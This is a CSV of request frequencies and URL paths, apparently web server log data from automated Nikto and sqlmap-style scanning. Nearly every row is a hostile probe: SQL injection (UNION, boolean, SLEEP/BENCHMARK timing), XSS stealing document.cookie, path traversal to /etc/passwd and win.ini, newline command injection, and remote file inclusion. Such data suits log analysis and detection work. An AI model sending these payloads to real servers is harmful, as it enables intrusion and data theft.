Frequency,Resource
1,/main.php?basepath=-2170%29%29%29%20UNION%20ALL%20SELECT%203076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%2C3076%23
1,/main.php?basepath=-7569%22%29%20OR%203452%3D6636%23
1,calendar
1,/TvLBvkHh.TPF
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
7,/pma/scripts/setup.php
1,/wp-includes/
1,"/phpwebsite/index.php?module=search&SEA_search_op=continue&PDA_limit=10\""><script>alert('Vulnerable')</script>"
1,"/downloads/pafiledb.php?action=download&id=4?\""&lt;script&gt;alert('Vulnerable')&lt;/script&gt;\"""
1,/modules.php?op=modload&name=Xforum&file=<script>alert('Vulnerable')</script>&fid=2
1,/cgi-bin/generate.cgi?content=../../../../../../../../../../windows/win.ini%00board=board_1
1,/cgi-local/cgiemail-1.6/cgicso?query=AAA
1,wwwadmin.pl
1,/modules.php?op=modload&name=DMOZGateway&file=index&topic=<script>alert('Vulnerable')</script>
1,/cab/top.shtml
1,/.perf
1,/main.php?basepath=-5768%29%29%29%20UNION%20ALL%20SELECT%205315%2CCONCAT%280x716a6b7671%2C0x62774745534873695847726d51574f586548687667744d567952534f6d50684b71566266654e6d68%2C0x71627a6a71%29%2C5315%2C5315%2C5315%23
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%23
1,/main.php?basepath=-8807%29%29%29%20UNION%20ALL%20SELECT%206541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%2C6541%23
1,campas?%0acat%0a/etc/passwd%0a
1,/cgi-bin/webmap.cgi
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/TvLBvkHh.Htm
1,/pt/
1,/main.php?basepath=-6032%29%29%29%20UNION%20ALL%20SELECT%208829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%2C8829%23
1,/TvLBvkHh.EXE
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
2,cgiwrap/~sshd
1,/main.php?basepath=-3055%22%20OR%207109%3D1375%23
1,/%3C/a%3E%3Cscript%3Ealert(%22xss%22)%3C/script%3E
1,/cgi-bin/generate.cgi?content=../../../../../../../../../../etc/passwd%00board=board_1
1,/index.html~
1,com5.java
1,/main.php?basepath=%60%29%20WHERE%206758%3D6758%20AND%201916%3D1916%23
1,af.cgi?_browser_out=.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2F.|.%2Fetc%2Fpasswd
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=%29%29%29%20OR%20ROW%283854%2C6798%29%3E%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%283854%3D3854%2C1%29%29%29%2C0x71627a6a71%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20%28SELECT%209801%20UNION%20SELECT%207918%20UNION%20SELECT%209543%20UNION%20SELECT%202964%29a%20GROUP%20BY%20x%29%20AND%20%28%28%286745%3D6745
1,/scripts/iisadmin/bdir.htr
1,/TvLBvkHh.html+
1,/index.php?dir=<script>alert('Vulnerable')</script>
2,/cgi-bin/cgiwrap/~nobody4
1,loadpage.cgi?user_id=1&file=../../../../../../../../../../etc/passwd
1,/main.php?basepath=-8185%22%29%29%29%20OR%209952%3D5390%23
1,/main.php?basepath=-6571%22%29%29%20OR%205746%3D5746%23
1,/CFIDE/probe.cfm
1,mrtg.cfg?cfg=../../../../../../../../etc/passwd
1,/vgn/performance/TMT/Report
1,/wikihome/action/conflict.php?TemplateDir=http://cirt.net/rfiinc.txt?
1,/netutils/whodata.stm?sitename=<script>alert(document.cookie)</script>
1,/servlet/com.unify.servletexec.UploadServlet
1,/phpinfo.php3?VARIABLE=<script>alert('Vulnerable')</script>
1,/main.php?basepath=%27%29%29%20AS%20hMfq%20WHERE%203232%3D3232%20AND%201916%3D1916%23
1,/TvLBvkHh.BBoardServlet
1,/cgi-bin/update.dpgs
1,shop/auth_data/auth_user_file.txt
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/post32.exe%7Cdir%20c:%5C%5C
1,/TvLBvkHh.xml+
1,/log.nsf
1,emumail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/TvLBvkHh.shtml
1,/TvLBvkHh.html~
1,/TvLBvkHh.pt-br
1,/TvLBvkHh.nn
1,/TvLBvkHh.no
1,/TvLBvkHh.nl
1,/.TvLBvkHh
1,/cgi-bin/handler
1,/cgi-bin/get32.exe
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/index.html%20
1,/main.php?basepath=-8174%29%29%29%20UNION%20ALL%20SELECT%206514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%2C6514%23
1,/ext.dll?MfcIsapiCommand=LoadPage&page=admin.hts%20&a0=add&a1=root&a2=%5C
1,/phpclassifieds/latestwap.php?url=<script>alert('Vulnerable');</script>
1,/cgi-bin/php.cgi?/etc/passwd
1,/SiteServer/Admin/knowledge/dsmgr/users/GroupManager.asp
1,/scripts/samples/search/author.idq
1,/cgi-bin/addbanner.cgi
1,/nsn/..%5Cutil/ren.bas
1,/inc/config.php
1,/cgi-bin/finger
1,/vgn/jsp/initialize
1,/fpdb/shop.mdb
1,/TvLBvkHh.idq
1,/scripts/Carello/Carello.dll
1,/mpcgi/
1,/TvLBvkHh.ida
1,/TvLBvkHh.idc
1,directorypro.cgi?want=showcat&show=../../../../../../../../../../etc/passwd%00
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/TvLBvkHh.htm
1,/%5BSecCheck%5D/..%252f..%252f../ext.ini
1,/admin.html
1,/cgi-bin/sojourn.cgi?cat=../../../../../../../../../../etc/password%00
1,/cfdocs/snippets/fileexists.cfm
1,/main.php?basepath=-9244%29%29%29%20UNION%20ALL%20SELECT%205861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%2C5861%23
1,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%206025%2C6025%2C6025%2CCONCAT%280x716a6b7671%2C0x654b47524c747941684e7a694771777868486969635543724b4c526e737745526c42567370485355%2C0x71627a6a71%29%2C6025%23
2,cgiwrap/~uucp
1,/cgi-bin/gm.cgi
1,/TvLBvkHh.htw
1,/webcalendar/week.php?eventinfo=<script>alert(document.cookie)</script>
1,/TvLBvkHh.htr
1,/cgi-bin/store/agora.cgi?page=whatever33.html
1,/main.php?basepath=%29%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%287031%2CCONCAT%280x5c%2C%28BENCHMARK%285000000%2CMD5%280x4f6a654f%29%29%29%29%29%2C1%29%20AND%20%28%28%286393%3D6393
1,/vgn/asp/style
1,/main.php?basepath=-2527
1,/ca//%5C%5C../%5C%5C../%5C%5C../%5C%5C../%5C%5C../%5C%5C../%5C%5Cwindows/%5C%5Cwin.ini
1,/cgi-bin/mailit.pl
1,/webMathematica/MSP?MSPStoreID=../../../../../../../../../../etc/passwd&MSPStoreType=image/gif
1,/cgi-bin/perl.exe
1,/cgi-bin/probecontrol.cgi?command=enable&userNikto=cancer&password=killer
1,/cbms/passgen.php
1,/main.php?basepath=-4023%29%29%29%20ORDER%20BY%206%23
1,/TvLBvkHh.htaccess~
1,/cgi-bin/ezadmin.cgi
1,/bin/
1,"/servlet/custMsg?guestName=<script>alert(\""Vulnerable\"")</script>"
1,/main.php?basepath=-5100%29%29%29%20UNION%20ALL%20SELECT%204344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%2C4344%23
1,/oem_webstage/cgi-bin/oemapp_cgi
1,"/phpwebchat/register.php?register=yes&username=OverG&email=<script>alert%20(\""Vulnerable\"")</script>&email1=<script>alert%20(\""Vulnerable\"")</script>"
1,/.nsf/../winnt/win.ini
1,/TvLBvkHh.cobalt
1,/main.php?basepath=%29%29%29%20OR%20NOT%2034%3D34%23
1,/cgi-bin/mail/emumail.cgi?type=/../../../../../../../../../../../../../../../../etc/passwd%00
1,/cgi-914/
1,/cgi-bin/flexform.cgi
1,/cgi-bin/.cobalt/alert/service.cgi?service=<img%20src=javascript:alert('Vulnerable')>
1,/vgn/performance/TMT
1,fortune
1,banner.cgi
1,/..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5Cboot.ini
1,way-board.cgi?db=/etc/passwd%00
1,/?mod=node&nid=some_thing&op=view
1,/main.php?basepath=-9036%29%29%29%20UNION%20ALL%20SELECT%207226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%2C7226%23
1,processit.pl
1,/TvLBvkHh.dpgs
2,/pmd/index.php
1,/cgi-bin/story.pl?next=../../../../../../../../../../etc/passwd%00
2,/cgi-bin/cgiwrap/~daemon
1,/cgi-bin/store.cgi?StartID=../../../../../../../../../../etc/passwd%00.html
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/cgi-bin/cgicso?query=AAA
1,/modules.php?op=modload&name=News&file=article&sid=<script>alert('Vulnerable');</script>
1,/vgn/ac/edit
1,mt/mt-load.cgi
1,awstats.pl
1,../abyss.conf
1,/main.php?basepath=-3666%29%29%29%20UNION%20ALL%20SELECT%206185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%2C6185%23
1,14all-1.1.cgi?cfg=../../../../../../../../etc/passwd
1,/apps/web/vs_diag.cgi?server=<script>alert('Vulnerable')</script>
1,/cgi-bin/astrocam.cgi
1,/cgi-bin/FormHandler.cgi?realNikto=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
2,/phpadmin/index.php
1,/snom300/
1,/admin/system_footer.php
1,/phones/
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=-8336%29%29%29%20UNION%20ALL%20SELECT%20CONCAT%280x716a6b7671%2C0x545778546c6b795a56654565476f61706c78704d4943636245654a6266464e6b4e6c4b784c70566c%2C0x71627a6a71%29%2C1731%2C1731%2C1731%2C1731%23
1,/main.php?basepath=-4049%29%29%29%20UNION%20ALL%20SELECT%209223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%2C9223%23
1,netauth.cgi?cmd=show&page=../../../../../../../../../../etc/passwd
1,addbanner.cgi
1,/cgi-bin/FormHandler.cgi?realname=aaa&email=aaa&reply_message_template=%2Fetc%2Fpasswd&reply_message_from=sq%40example.com&redirect=http%3A%2F%2Fwww.example.com&recipient=sq%40example.com
1,/cgi-bin/handler.cgi
3,//myadmin/scripts/setup.php
1,/scripts/root.exe?/c+dir+c:\+/OG
2,/modules.php?name=Downloads&d_op=viewdownload
1,/SiteServer/Admin/knowledge/persmbr/VsTmPr.asp
1,/cgi-bin/wais.pl
1,/TvLBvkHh.jsp
1,architext_query.pl
1,/scripts/tools/ctss.idc
1,/TvLBvkHh.show_query_columns
1,/TvLBvkHh.jse
1,/main.php?basepath=%22%29%29%20AS%20eKtk%20WHERE%207950%3D7950%20AND%203168%3D6417%23
1,/asterisk/phoneprov/
1,/TvLBvkHh.jsa
1,/phoneprov/
1,/cgi/cfdocs/expeval/ExprCalc.cfm?OpenFilePath=c:\windows\win.ini
1,way-board/way-board.cgi?db=/etc/passwd%00
1,/main.php?basepath=-9126%29%29%29%20UNION%20ALL%20SELECT%206248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%2C6248%23
1,/cgi-bin/mrtg.cgi?cfg=../../../../../../../../etc/passwd
1,/%0A%0A%3Cscript%3Ealert(%5C%22Vulnerable%5C%22)%3C/script%3E.jsp
2,/admin/mysql/index.php
1,/article.php?article=4965&post=1111111111
1,/cgi-bin/story/story.pl?next=../../../../../../../../../../etc/passwd%00
1,get32.exe
1,/main.php?basepath=-7999%25%22%29%29%29%20OR%202463%3D1093%23
1,/main.php?basepath=-7695%29%29%29%20UNION%20ALL%20SELECT%205283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%2C5283%23
1,/PDG_Cart/oder.log
1,/esp?PAGE=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
2,/myadmin2/index.php
1,/polycom/
1,/vgn/ppstats
1,/exchange/lib/GETREND.INC
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=%22%20OR%20NOT%201822%3D1218%23
1,/main.php?basepath=-2941%25%27%29%29%20OR%205746%3D5746%23
1,/cfg/
2,pbcgi.cgi?Nikto=Joe%Camel&email=%3CSCRIPT%3Ealert%28%27Vulnerable%27%29%3B%3C%2FSCRIPT%3E
1,/main.php?basepath=%29%29%29%3B%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29rrWB%29%20AND%20%28%28%282979%3D2979
1,/modules/Forums/bb_smilies.php?site_font=}--></style><script>alert('Vulnerable')</script>
1,/cgi-bin/Count.cgi
1,/cgi-bin/technote/main.cgi?board=FREE_BOARD&command=down_load&filename=/../../../../../../../../../../etc/passwd
1,/snom/
4,/main.php?basepath=%29%29%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%23
1,/main.php?basepath=%28SELECT%20CONCAT%280x716a6b7671%2C%28SELECT%20%28ELT%288468%3D8468%2C1%29%29%29%2C0x71627a6a71%29%29
1,shop/orders/orders.txt
1,/main.php?basepath=-5406%29%29%29%20UNION%20ALL%20SELECT%206872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%2C6872%23
1,/cgi-bin/netauth.cgi?cmd=show&page=../../../../../../../../../../etc/passwd
1,/TvLBvkHh.cgi+
2,/cgi-bin/cgiwrap/~guest
1,/................../config.sys
1,/netget?sid=user&msg=300&file=../../../../../../../../../../etc/passwd
1,/.git/index
1,/main.php?basepath=%29%29%29%20OR%20NOT%207965%3D6814%23
1,/~root/
1,/cgi-local/
1,/cgi-bin/commerce.cgi?page=../../../../../../../../../../etc/passwd%00index.html
1,/horde/imp/test.php
1,/cfdocs/exampleapp/docs/sourcewindow.cfm?Template=c:\boot.ini
2,/nikto-test-5C00ChAL.html
1,/TvLBvkHh.lst
1,/https-admserv/bin/index?/<script>alert(document.cookie)</script>
3,/%00/
